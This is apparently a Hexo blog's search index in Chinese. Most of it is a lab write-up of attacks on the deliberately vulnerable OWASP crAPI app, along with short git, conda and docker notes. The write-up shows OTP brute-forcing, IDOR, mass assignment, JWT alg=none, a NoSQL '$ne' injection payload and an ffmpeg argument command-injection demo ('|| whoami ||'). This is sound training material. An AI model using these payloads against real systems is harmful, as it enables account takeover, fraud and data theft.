<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>git 报错</title>
    <url>/posts/bce5d03c.html</url>
    <content><![CDATA[<p>warning: in the working copy of ‘archives&#x2F;2024&#x2F;09&#x2F;index.html’, LF will be replaced by CRLF the next time Git touches it</p>
]]></content>
      <categories>
        <category>报错</category>
      </categories>
      <tags>
        <tag>Git报错</tag>
      </tags>
  </entry>
  <entry>
    <title>anaconda使用</title>
    <url>/posts/a5f86784.html</url>
    <content><![CDATA[<h1 id="创建新的环境"><a href="#创建新的环境" class="headerlink" title="创建新的环境"></a>创建新的环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda create --name myenv</span><br></pre></td></tr></table></figure>
<h1 id="激活环境"><a href="#激活环境" class="headerlink" title="激活环境"></a>激活环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda activate myenv</span><br></pre></td></tr></table></figure>
<h1 id="安装包"><a href="#安装包" class="headerlink" title="安装包"></a>安装包</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda install package_name</span><br></pre></td></tr></table></figure>
<h1 id="移除包"><a href="#移除包" class="headerlink" title="移除包"></a>移除包</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda remove package_name</span><br></pre></td></tr></table></figure>
<h1 id="更新包"><a href="#更新包" class="headerlink" title="更新包"></a>更新包</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda update package_name</span><br></pre></td></tr></table></figure>
<h1 id="列出已安装的包"><a href="#列出已安装的包" class="headerlink" title="列出已安装的包"></a>列出已安装的包</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda list</span><br></pre></td></tr></table></figure>
<h1 id="搜索可用的包"><a href="#搜索可用的包" class="headerlink" title="搜索可用的包"></a>搜索可用的包</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda search package_name</span><br></pre></td></tr></table></figure>
<h1 id="导出环境"><a href="#导出环境" class="headerlink" title="导出环境"></a>导出环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda env export &gt; environment.yml</span><br></pre></td></tr></table></figure>
<h1 id="导入环境"><a href="#导入环境" class="headerlink" title="导入环境"></a>导入环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda env create -f environment.yml</span><br></pre></td></tr></table></figure>
<h1 id="列出所有环境"><a href="#列出所有环境" class="headerlink" title="列出所有环境"></a>列出所有环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda env list</span><br></pre></td></tr></table></figure>
<h1 id="移除环境"><a href="#移除环境" class="headerlink" title="移除环境"></a>移除环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda env remove --name myenv</span><br></pre></td></tr></table></figure>
<h1 id="更新conda"><a href="#更新conda" class="headerlink" title="更新conda"></a>更新conda</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda update conda</span><br></pre></td></tr></table></figure>
<h1 id="更新Anaconda"><a href="#更新Anaconda" class="headerlink" title="更新Anaconda"></a>更新Anaconda</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda update anaconda</span><br></pre></td></tr></table></figure>
<h1 id="更新所有包"><a href="#更新所有包" class="headerlink" title="更新所有包"></a>更新所有包</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda update --all</span><br></pre></td></tr></table></figure>
<h1 id="查看conda帮助"><a href="#查看conda帮助" class="headerlink" title="查看conda帮助"></a>查看conda帮助</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda --help</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>anaconda</tag>
      </tags>
  </entry>
  <entry>
    <title>虚拟机docker下crapi开启容器时s无法使用ip+port进行访问</title>
    <url>/posts/432259a6.html</url>
    <content><![CDATA[<h1 id="情景"><a href="#情景" class="headerlink" title="情景"></a>情景</h1><p>使用虚拟机kali，内安装docker及docker-compose，拉取crapi漏洞靶场环境，可使用127.0.0.1:8888和0.0.0.0:8888访问web环境<br>虚拟机及主机无法通过ip+端口方式访问</p>
<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>检查防火墙<br>systemctl status firewalled.service<br>检查转发（值为1开启转发）<br>cat &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward<br>检查ip是否可访问<br>ping ip<br>检查端口是否开放<br>netstat -ntlup | grep 端口</p>
<p>检查容器监听端口和服务器<br>docker ps 发现容器下端口映射为127.0.0.1:8888 -&gt; 80</p>
<h1 id="修改文件"><a href="#修改文件" class="headerlink" title="修改文件"></a>修改文件</h1><p>vim修改docker-compose.yml<br>第1行至第250行进行替换<br>:1,250 s&#x2F;127.0.0.1&#x2F;192.168.52.132&#x2F;g</p>
<p>修改完成后可访问成功</p>
]]></content>
      <categories>
        <category>报错</category>
      </categories>
      <tags>
        <tag>docker报错</tag>
      </tags>
  </entry>
  <entry>
    <title>dockerpostgres</title>
    <url>/posts/d8a3a561.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>linux下doker搭建crapi靶场渗透练习</title>
    <url>/posts/ad05d80f.html</url>
    <content><![CDATA[<h1 id="api测试小技巧"><a href="#api测试小技巧" class="headerlink" title="api测试小技巧"></a>api测试小技巧</h1><p>靶场内多个思路可从该文章内参考<br>摘: <a href="https://github.com/inonshk/31-days-of-API-Security-Tips">https://github.com/inonshk/31-days-of-API-Security-Tips</a><br>中文: <a href="https://cloud.tencent.com/developer/article/1805577">https://cloud.tencent.com/developer/article/1805577</a></p>
<h1 id="docker-compose搭建crapi"><a href="#docker-compose搭建crapi" class="headerlink" title="docker-compose搭建crapi"></a>docker-compose搭建crapi</h1><p>crapi项目: <a href="https://github.com/OWASP/crAPI">https://github.com/OWASP/crAPI</a><br>前提：拥有docker及docker-compose组件</p>
<h1 id="linux环境部署"><a href="#linux环境部署" class="headerlink" title="linux环境部署"></a>linux环境部署</h1><p>由于本次靶场练习环境为虚拟机linux使用docker容器部署crapi，使用windows通过IP+port访问web环境，需对下载yml文件进行修改:<br>(若命令下载yml文件失败可主机下载后粘贴到linux下)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">编辑文件</span><br><span class="line">vim docker-compose.yml</span><br><span class="line"></span><br><span class="line">替换IP</span><br><span class="line">:1,250 s/127.0.0.1/192.168.80.129(your-ip)/g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1,250 s/192.168.80.129/192.168.2.8/g</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>若替换成功，则容器访问web的ip映射为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/workspace/crapi/crAPI-1.1.5]</span><br><span class="line">└─# docker ps                               </span><br><span class="line">CONTAINER ID   IMAGE                          COMMAND                  CREATED          STATUS                      PORTS                                                       NAMES</span><br><span class="line">34d024bd3e3c   crapi/crapi-web:latest         &quot;/bin/sh -c /etc/ngi…&quot;   48 minutes ago   Up 48 minutes (healthy)     192.168.80.129:8888-&gt;80/tcp, 192.168.80.129:8443-&gt;443/tcp   crapi-web</span><br></pre></td></tr></table></figure>

<p>最新稳定版本:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -o docker-compose.yml https://raw.githubusercontent.com/OWASP/crAPI/main/deploy/docker/docker-compose.yml</span><br><span class="line"></span><br><span class="line">docker-compose pull</span><br><span class="line"></span><br><span class="line">docker-compose -f docker-compose.yml --compatibility up -d</span><br></pre></td></tr></table></figure>
<p>最新开发版本:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -o docker-compose.yml https://raw.githubusercontent.com/OWASP/crAPI/develop/deploy/docker/docker-compose.yml</span><br><span class="line"></span><br><span class="line">VERSION=develop docker-compose pull</span><br><span class="line"></span><br><span class="line">VERSION=develop docker-compose -f docker-compose.yml --compatibility up -d</span><br></pre></td></tr></table></figure>
<h1 id="web站点结构梳理"><a href="#web站点结构梳理" class="headerlink" title="web站点结构梳理"></a>web站点结构梳理</h1><p>通过设置bp代理，手工浏览网页，target会自动记录站点信息<br><img src="/img/crapi/targetscan.png"></p>
<h1 id="api结构"><a href="#api结构" class="headerlink" title="api结构"></a>api结构</h1><p>根据对web站点的结构梳理，存在以下api:</p>
<h2 id="community交流板块"><a href="#community交流板块" class="headerlink" title="community交流板块"></a>community交流板块</h2><h3 id="community界面"><a href="#community界面" class="headerlink" title="community界面"></a>community界面</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">community单个帖子</span><br><span class="line">/community/api/v2/community/posts/5y2b9gX7gFHhYeJxQ4STXN</span><br><span class="line"></span><br><span class="line">community板块下所有帖子</span><br><span class="line">/community/api/v2/community/posts/recent?limit=30&amp;offset=0</span><br></pre></td></tr></table></figure>
<h3 id="coupon优惠券验证"><a href="#coupon优惠券验证" class="headerlink" title="coupon优惠券验证"></a>coupon优惠券验证</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">优惠券验证(响应请求方法失败)</span><br><span class="line">/community/api/v2/coupon/validate-coupon</span><br></pre></td></tr></table></figure>
<h2 id="identify身份认证功能"><a href="#identify身份认证功能" class="headerlink" title="identify身份认证功能"></a>identify身份认证功能</h2><h3 id="auth登录、注册、忘记密码"><a href="#auth登录、注册、忘记密码" class="headerlink" title="auth登录、注册、忘记密码"></a>auth登录、注册、忘记密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">forget-password忘记密码功能</span><br><span class="line">/identity/api/auth/forget-password</span><br><span class="line"></span><br><span class="line">login登录功能</span><br><span class="line">/identity/api/auth/login</span><br><span class="line"></span><br><span class="line">signup注册功能</span><br><span class="line">/identity/api/auth/signup</span><br></pre></td></tr></table></figure>
<h3 id="v3-otp验证"><a href="#v3-otp验证" class="headerlink" title="v3-otp验证"></a>v3-otp验证</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">otp验证功能</span><br><span class="line">/identity/api/auth/v3/check-otp</span><br></pre></td></tr></table></figure>
<h2 id="v2用户与车辆接口"><a href="#v2用户与车辆接口" class="headerlink" title="v2用户与车辆接口"></a>v2用户与车辆接口</h2><h3 id="user"><a href="#user" class="headerlink" title="user"></a>user</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">个人用户修改邮箱功能</span><br><span class="line">/identity/api/v2/user/change-email</span><br><span class="line"></span><br><span class="line">个人用户仪表板界面</span><br><span class="line">/identity/api/v2/user/dashboard</span><br><span class="line"></span><br><span class="line">个人头像上传功能</span><br><span class="line">/identity/api/v2/user/pictures</span><br><span class="line"></span><br><span class="line">个人用户密码重置功能</span><br><span class="line">/identity/api/v2/user/reset-password</span><br><span class="line"></span><br><span class="line">个人邮箱重置校验功能</span><br><span class="line">/identity/api/v2/user/verify-email-token</span><br><span class="line"></span><br><span class="line">个人视频上传功能</span><br><span class="line">/identity/api/v2/user/videos</span><br><span class="line"></span><br><span class="line">个人视频名称修改</span><br><span class="line">/identity/api/v2/user/videos/52</span><br><span class="line"></span><br><span class="line">个人视频更换</span><br><span class="line">/identity/api/v2/user/videos/convert_video</span><br></pre></td></tr></table></figure>
<h3 id="vehicle"><a href="#vehicle" class="headerlink" title="vehicle"></a>vehicle</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">个人车辆添加功能</span><br><span class="line">/identity/api/v2/vehicle/add_vehicle</span><br><span class="line"></span><br><span class="line">车辆经纬度位置</span><br><span class="line">/identity/api/v2/vehicle/f597527e-a9d9-4c04-a6c6-5a6a82f1905e/location</span><br><span class="line"></span><br><span class="line">购买车辆验证码发送邮箱</span><br><span class="line">/identity/api/v2/vehicle/resend_email</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="workshop"><a href="#workshop" class="headerlink" title="workshop"></a>workshop</h2><h3 id="mechanic"><a href="#mechanic" class="headerlink" title="mechanic"></a>mechanic</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/workshop/api/mechanic/mechanic_report?report_id=11</span><br></pre></td></tr></table></figure>
<h3 id="merchant"><a href="#merchant" class="headerlink" title="merchant"></a>merchant</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/workshop/api/merchant/contact_mechanic</span><br></pre></td></tr></table></figure>
<h3 id="shop"><a href="#shop" class="headerlink" title="shop"></a>shop</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">订单购买</span><br><span class="line">/workshop/api/shop/orders</span><br><span class="line"></span><br><span class="line">总订单序号</span><br><span class="line">/workshop/api/shop/orders/16</span><br><span class="line"></span><br><span class="line">个人订单页</span><br><span class="line">/workshop/api/shop/orders/all?limit=30&amp;offset=0</span><br><span class="line"></span><br><span class="line">订单取消</span><br><span class="line">/workshop/api/shop/orders/return_order</span><br><span class="line"></span><br><span class="line">产品页</span><br><span class="line">/workshop/api/shop/products?limit=30&amp;offset=0</span><br></pre></td></tr></table></figure>

<h1 id="失效的对象级别授权"><a href="#失效的对象级别授权" class="headerlink" title="失效的对象级别授权"></a>失效的对象级别授权</h1><p>Broken Object Level Authorization，它可以使API 端点不必要地公开很多数据属性，超过了该端点发挥其功能所需的数量，进而导致忽视最低权限原则<br>此漏洞会在无意中为攻击者提供过多的数据，然后攻击者会利用这些数据找到更多漏洞或 挖掘敏感数据</p>
<h2 id="1-其他用户车辆信息"><a href="#1-其他用户车辆信息" class="headerlink" title="1.其他用户车辆信息"></a>1.其他用户车辆信息</h2><p>访问&#x2F;community&#x2F;api&#x2F;v2&#x2F;community&#x2F;posts&#x2F;recent<br>页面显示内容仅有头像、title、上传人名、内容、上传时间<br><img src="/img/crapi/bolaweb.png"><br>抓包显示包含额外的信息如email、vehicle id<br><img src="/img/crapi/bolabp.png"><br>存在接口识别vehicle id定位车辆经纬度的功能<br>&#x2F;identity&#x2F;api&#x2F;v2&#x2F;vehicle&#x2F;your-vehicle_id&#x2F;location<br>页面功能点位置<br><img src="/img/crapi/locationweb.png"><br>通过修改vehicle id为其他用户的值，可查看其他用户的车辆详细信息<br><img src="/img/crapi/locationbp.png"></p>
<h2 id="2-其他用户的问题报告"><a href="#2-其他用户的问题报告" class="headerlink" title="2.其他用户的问题报告"></a>2.其他用户的问题报告</h2><p>页面功能点位置，需填写联系的机械师，及报告内容<br><img src="/img/crapi/reportweb.png"><br>可发现vin、报告接收接口及发送次数，拦截该请求并抓返回包<br><img src="/img/crapi/reportbp.png"><br>可发现返回包发现新的接口及报告序号<br><img src="/img/crapi/reportback.png"><br>直接访问其他报告确实authentication，出现缺失JWT认证<br>:<a href="http://192.168.80.129:8888/workshop/api/mechanic/mechanic_report?report_id=1">http://192.168.80.129:8888/workshop/api/mechanic/mechanic_report?report_id=1</a><br><img src="/img/crapi/otherreporterror.png"></p>
<p>抓包携带authentication，内部修改id值可显示其他用户报告内容，并泄露机械师email、number用户车辆vin值、number等敏感信息<br><img src="/img/crapi/otherreport.png"></p>
<h1 id="失效的用户身份验证"><a href="#失效的用户身份验证" class="headerlink" title="失效的用户身份验证"></a>失效的用户身份验证</h1><p>Broken User Authentication<br>API在访问时未对请求方进行身份验证或身份验证存在问题导致易被破解<br>如:<br>未校验令牌的有效性<br>更新密码接口未限制请求频率，旧密码参数可暴力破解<br>短信验证码或者邮箱验证码有效期超出 10 分钟或者长度小于 6 位</p>
<h2 id="3-重置其他用户的密码"><a href="#3-重置其他用户的密码" class="headerlink" title="3.重置其他用户的密码"></a>3.重置其他用户的密码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小技巧:</span><br><span class="line">旧的API版本通常会包含更多的安全漏洞，他们缺乏一些安全机制。我们可以使用REST API的一些特征来预测是否存在旧的API版本。</span><br><span class="line">比如当前有一个API被命名为/api/v3/login ，我们可以检查/api/v1/login是否存在 。</span><br></pre></td></tr></table></figure>
<p>个人用户登录web界面位于右上角，直接填修改后的密码<br><img src="/img/crapi/userpasswdweb.png"><br>经验证个人用户登录后的重置密码是根据authentication识别重置相关用户的密码<br><img src="/img/crapi/userpasswdbp.png"><br>登录界面forget password的web页面<br>修改流程:(以 <a href="mailto:&#x70;&#111;&#x67;&#x62;&#97;&#x30;&#x30;&#54;&#64;&#101;&#120;&#x61;&#109;&#x70;&#108;&#101;&#46;&#x63;&#x6f;&#109;">&#x70;&#111;&#x67;&#x62;&#97;&#x30;&#x30;&#54;&#64;&#101;&#120;&#x61;&#109;&#x70;&#108;&#101;&#46;&#x63;&#x6f;&#109;</a> 为例)<br>输入需要修改密码的用户email<br>邮箱接收到验证码otp，输入验证码和需修改的密码<br><img src="/img/crapi/forgetpasswdweb.png"><br>抓包的页面可以看到输入的otp值1111错误(想自己的邮箱发送密码重置申请确认otp长度为4，可尝试爆破)<br><img src="/img/crapi/forgetpasswdbp.png"><br>爆破intruder模块设置(按照验证码0000格式爆破)<br><img src="/img/crapi/otpattacksetting.png"></p>
<p>发送多次后发现存在爆破次数上限<br><img src="/img/crapi/otpattackerrorbp.png"><br>查看接口发现存在v3，判断是否存在历史版本接口v1或v2(v1经验证不存在，v2未对爆破次数作限制)<br><img src="/img/crapi/otpattacksuccessbp.png"><br>经爆破otp验证码未6216，尝试修改密码后登录成功<br><img src="/img/crapi/loginsuccess.png"></p>
<h1 id="过度数据暴露"><a href="#过度数据暴露" class="headerlink" title="过度数据暴露"></a>过度数据暴露</h1><p>Excessive Data Exposure<br>过度数据暴露是一种安全漏洞，当您的前端请求的数据超过预期时就会发生这种情况。在 Web 应用程序中，任何人都可以打开浏览器开发人员工具并检查传入和传出的 HTTP 请求。他们可以看到从这些请求中收到的数据负载。<br>因此，即使前端不一定使用或消费这些数据，攻击者仍然可以通过 API 调用查看这些数据。如果 API 发送的数据比前端需要的敏感数据多，攻击者就可以利用这些数据对用户造成损害。<br>这被称为过度数据暴露。在过度数据暴露中，暴露的敏感数据实际上比任何人可以访问的数据都要多。</p>
<h2 id="4-其他用户敏感信息api接口"><a href="#4-其他用户敏感信息api接口" class="headerlink" title="4.其他用户敏感信息api接口"></a>4.其他用户敏感信息api接口</h2><p>访问&#x2F;community&#x2F;api&#x2F;v2&#x2F;community&#x2F;posts&#x2F;recent<br><img src="/img/crapi/bolabp.png"></p>
<h2 id="5-视频内部属性api接口"><a href="#5-视频内部属性api接口" class="headerlink" title="5.视频内部属性api接口"></a>5.视频内部属性api接口</h2><p>已知关于视频的api接口<br>&#x2F;identity&#x2F;api&#x2F;v2&#x2F;user&#x2F;videos<br>&#x2F;identity&#x2F;api&#x2F;v2&#x2F;user&#x2F;videos&#x2F;id值(抓包内的id)<br>&#x2F;identity&#x2F;api&#x2F;v2&#x2F;user&#x2F;videos&#x2F;convert_video<br>(其内包含 conversion_params”:”-v codec h264 似乎可以管道符命令注入，不过网上资料过少，待以后补充)<br><img src="/img/crapi/uploadvideobp.png"><br>md文档提示可利用泄露的视频api接口利用其他漏洞，尝试越权访问，修改第二个接口上传PUT改为GET并爆破id值失败，无法爆破其他人的视频数据，返回值与当前authentication绑定</p>
<h1 id="资源缺乏和速率限制"><a href="#资源缺乏和速率限制" class="headerlink" title="资源缺乏和速率限制"></a>资源缺乏和速率限制</h1><p>Lack of Resources &amp; Rate Limiting<br>速率限制是计算机系统中使用的一种技术，用于控制允许请求或操作的速率。它通常用于防止滥用、保护资源和维护系统稳定性。<br>速率限制可以应用于各种环境中，例如API速率限制、登录尝试，甚至可以用于防御DDoS攻击。</p>
<h2 id="6-使用-“contact-mechanic”-功能完成第7层DoS"><a href="#6-使用-“contact-mechanic”-功能完成第7层DoS" class="headerlink" title="6.使用 “contact mechanic” 功能完成第7层DoS"></a>6.使用 “contact mechanic” 功能完成第7层DoS</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小技巧:</span><br><span class="line">发现一个limit / page参数?(例如:/api/news?limit=100)它可能容易受到7层DoS的攻击。尝试发送一个长值(例如:limit=999999999)，看看会发生什么</span><br></pre></td></tr></table></figure>
<p>在接口处 &#x2F;workshop&#x2F;api&#x2F;merchant&#x2F;contact_mechanic 发现 repeat_request_if_failed 和 number_of_repeats<br><img src="/img/crapi/repeatsbp.png"><br>repeat_request_if_failed值改为true，如果发送失败则再次发送，number_of_repeats值增加，再次发送<br>显示: 服务不可用。似乎是您造成了第7层DoS<br><img src="/img/crapi/ddos.png"></p>
<p>除此之外在商品显示界面的limit值修改增加也出现了server error不知道算不算ddos<br><img src="/img/crapi/ddoserror.png"></p>
<h1 id="失效的功能级别授权"><a href="#失效的功能级别授权" class="headerlink" title="失效的功能级别授权"></a>失效的功能级别授权</h1><p>Broken Function Level Authorization<br>功能级别授权中断(BFLA)是一种安全漏洞，当应用程序或系统没有在功能或功能级别正确实施访问控制时会发生。它允许用户执行他们不应该有权限使用的操作或访问功能。</p>
<h2 id="7-删除其他用户视频"><a href="#7-删除其他用户视频" class="headerlink" title="7.删除其他用户视频"></a>7.删除其他用户视频</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小技巧:</span><br><span class="line">1.利用REST的可预测特性来查找管理API endpoints!比如你看到一个api叫做GET /api/v1/users/&lt;id&gt;，我们可以试着修改请求方法POST/DELETE来create/delete users.</span><br><span class="line">2.</span><br></pre></td></tr></table></figure>
<p>测试三个video接口，修改http请求为delete，发现接口&#x2F;identity&#x2F;api&#x2F;v2&#x2F;user&#x2F;videos&#x2F;修改后提示非admin用户，猜测将user修改为admin<br><img src="/img/crapi/deletevideobp1.png"><br>删除成功(若页面显示仍存在视频，可以清空缓存或换浏览器访问)<br><img src="/img/crapi/deletevideobp2.png"><br>目前只删除了个人用户的视频，分析接口后跟随一个数值，猜测该值为所有视频的id值，将包放入intruder模块为id添加payload爆破，删除成功<br><img src="/img/crapi/deleteothervideobp.png"></p>
<h1 id="批量分配-大量赋值"><a href="#批量分配-大量赋值" class="headerlink" title="批量分配&#x2F;大量赋值"></a>批量分配&#x2F;大量赋值</h1><p>Mass Assignment<br>大规模赋值是一种安全漏洞，当攻击者可以操纵输入数据来修改对象的属性时，就会出现这种漏洞，这通常会导致系统中发生未经授权的更改。<br>当开发人员没有正确地验证和清理用户输入或未能限制对象中哪些属性可以修改时，就会发生这种情况。</p>
<h2 id="8-免费获得物品"><a href="#8-免费获得物品" class="headerlink" title="8.免费获得物品"></a>8.免费获得物品</h2><p>初始Available Balance为100.选择购买一件商品，值减少为90，若退货成功则值回到100<br>查看所有商品页面的接口，找到status状态存在两种状态，delivered、return pending。交付完毕和等待退货，猜测还有个退货成功的状态<br><img src="/img/crapi/orderstatus.png"><br>点击一个已购买的商品详情，修改请求为PUT，添加参数status值为return尝试将商品状态改为退货状态，显示status值只有’delivered’,’return pending’ or ‘returned’<br><img src="/img/crapi/orderreturnedbp1.png"><br>重新添加参数值为returned，退款成功<br>(货拿到了钱退回来了美滋滋~)<br><img src="/img/crapi/orderreturnedbp2.png"></p>
<h2 id="9-余额增加"><a href="#9-余额增加" class="headerlink" title="9.余额增加"></a>9.余额增加</h2><p>余额增加的洞目前找到了两种，一种类似上述的免费获得物品，通过修改购买数量再修改status值获得退款余额，就不水了，另一种是通过修改购买接口的数量为负数:<br><img src="/img/crapi/moneyaddbp.png"></p>
<h2 id="10-更新视频内部属性"><a href="#10-更新视频内部属性" class="headerlink" title="10.更新视频内部属性"></a>10.更新视频内部属性</h2><p>在之前视频属性内部api接口挑战中存在conversation_params参数，值为 -v codec h264，翻找资料似乎为FFmpeg的命令格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-v codec h264：这是用于指定视频编码的选项。</span><br><span class="line">-v 是视频编码的缩写（等价于 -c:v），用于表明后续设置应用于视频流。</span><br><span class="line">codec 表示要指定的编解码器。</span><br><span class="line">h264 是视频编码的格式，这种编码常用于网络流媒体和视频压缩，具有良好的压缩效率和兼容性。</span><br><span class="line">涉及的技术和知识</span><br><span class="line">视频编码和解码：H.264 是一种视频压缩标准，广泛应用于视频流媒体、视频存储和传输中。了解 H.264 编码格式、编码效率、视频质量和带宽需求等，是视频处理领域的基础知识。</span><br><span class="line">FFmpeg 命令行工具：FFmpeg 提供了丰富的命令选项，可用于各种视频和音频格式的转换与处理。了解 FFmpeg 命令的基础格式（如输入文件、输出文件、编码选项等）可以帮助进行视频处理的自动化。</span><br><span class="line">视频格式与容器：在视频编码的过程中，不仅涉及编码格式，还涉及容器（如 MP4、MKV 等）。不同的容器对视频流和音频流的兼容性也各不相同。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在linux内ffmpeg命令(转换视频编码为 H.264)格式</span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# ffmpeg -i 1.mp4 -vcodec h264 2.mp4</span><br><span class="line"></span><br><span class="line">尝试构造命令执行可成功</span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# ffmpeg -i 1.mp4 -vcodec h264 || whoami || 3.mp4</span><br><span class="line">...省略一堆内容...</span><br><span class="line">At least one output file must be specified</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<p>暂时不做深度利用了，单纯修改视频内部属性:(最近爆了一个ffmpeg堆溢出洞有兴趣的可以取康康CVE-2024-7272)<br><img src="/img/crapi/changevideo.png"></p>
<h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><h2 id="11-crapi发送http至baidu-com并成功返回http响应"><a href="#11-crapi发送http至baidu-com并成功返回http响应" class="headerlink" title="11.crapi发送http至baidu.com并成功返回http响应"></a>11.crapi发送http至baidu.com并成功返回http响应</h2><p>ssrf常出现在向其他服务器请求获取数据的位置，crapi靶场在发送问题报告的接口&#x2F;workshop&#x2F;api&#x2F;merchant&#x2F;contact_mechanic<br>mechanic_api参数存在向url地址请求数据，修改为给<a href="https://www.baidu.com/">https://www.baidu.com</a><br><img src="/img/crapi/ssrf.png"></p>
<h1 id="nosql注入"><a href="#nosql注入" class="headerlink" title="nosql注入"></a>nosql注入</h1><h2 id="12-免费获得优惠券而不知道优惠券代码"><a href="#12-免费获得优惠券而不知道优惠券代码" class="headerlink" title="12.免费获得优惠券而不知道优惠券代码"></a>12.免费获得优惠券而不知道优惠券代码</h2><p>题目提示为nosql注入，优惠券相关接口:<br>&#x2F;community&#x2F;api&#x2F;v2&#x2F;coupon&#x2F;validate-coupon<br>猜测数据库构造的语句:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.coupon.find(&#123;&#x27;coupon_code&#x27;:&#x27;优惠券值&#x27;&#125;)</span><br></pre></td></tr></table></figure>
<p>对该查询语句的绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;coupon_code&quot;:&#123;&quot;$ne&quot;:&quot;1&quot;&#125; &#125;</span><br></pre></td></tr></table></figure>
<p>写入后查询语句为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.coupon.find(&#123;&#x27;coupon_code&#x27;:&#123;&quot;$ne&quot;:&quot;1&quot;&#125; &#125;)</span><br></pre></td></tr></table></figure>
<p>相当于SQL注入的:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM coupon WHERE coupon_code &lt;&gt; &#x27;1&#x27;;</span><br></pre></td></tr></table></figure>
<p><img src="/img/crapi/nosqlinject.png"></p>
<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="13-找到一种方法来兑换您已经通过修改数据库领取的优惠券"><a href="#13-找到一种方法来兑换您已经通过修改数据库领取的优惠券" class="headerlink" title="13.找到一种方法来兑换您已经通过修改数据库领取的优惠券"></a>13.找到一种方法来兑换您已经通过修改数据库领取的优惠券</h2><p><img src="/img/crapi/applycode.png"><br>题目提示sql注入，对coupon_code输入其他值显示不存在<br><img src="/img/crapi/sqlinjecterror.png"><br>sql注入成功(但显示这张券已被使用，似乎兑换券只有一张？？)<br><img src="/img/crapi/sqlinject.png"></p>
<h1 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h1><h2 id="14-不为用户执行身份验证的api接口"><a href="#14-不为用户执行身份验证的api接口" class="headerlink" title="14.不为用户执行身份验证的api接口"></a>14.不为用户执行身份验证的api接口</h2><p>不需要cookies或authentication即可访问的页面<br><img src="/img/crapi/unauthentic.png"></p>
<h1 id="JWT漏洞"><a href="#JWT漏洞" class="headerlink" title="JWT漏洞"></a>JWT漏洞</h1><h2 id="15-jwt令牌绕过"><a href="#15-jwt令牌绕过" class="headerlink" title="15.jwt令牌绕过"></a>15.jwt令牌绕过</h2><p>将jwt验证alg值改为none<br><img src="/img/crapi/jwt1.png"><br>将authentication的signature删除<br><img src="/img/crapi/jwt2.png"></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>API安全</tag>
      </tags>
  </entry>
  <entry>
    <title>容器服务启动失败</title>
    <url>/posts/5746187b.html</url>
    <content><![CDATA[<p>ERROR: for mongodb  Cannot create container for service mongodb: Conflict. The container name “&#x2F;mongodb” is already in use by container “193a1f7f78319eeb43040d2a7b314be04a5b2a915add2df4d8cf6b07f6c1252d”. You have to remove (or rename) that container to be able to reuse that name.<br>ERROR: Encountered errors while bringing up the project.</p>
<p>for mongodb无法为服务mongodb创建容器：冲突。容器名称“&#x2F;mongodb”已被容器“193a1f7f78319eeb43040d2a7b314be04a5b2a915add2df4d8cf6b07f6c1252d”使用。您必须删除（或重命名）该容器才能重用该名称。<br>错误：启动项目时遇到错误。</p>
